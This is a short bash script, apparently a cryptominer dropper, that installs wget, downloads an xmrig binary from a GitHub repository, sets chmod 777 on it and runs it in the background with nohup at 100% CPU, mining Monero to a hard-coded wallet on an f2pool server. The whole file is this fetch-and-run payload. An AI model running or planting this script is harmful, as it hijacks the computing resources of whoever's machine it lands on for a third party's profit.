#!/bin/bash
sleep 15
yum install wget -y
wget https://github.com/2319763378/pool/raw/master/xmrig
chmod 777 xmrig
nohup ./xmrig -l he18789683272.001 --max-cpu-usage 100 -o  xmr.f2pool.com:13531 -u 4Ar6RcYY4jrjfb5vc1NZpHLfrwr6VRUzPTsajLh9JSwXPJhFuTRbfTF1DYbZzaMMXnbq3Th3xQ6TpbhBd7CgnZmWT932UAt -p x -k &
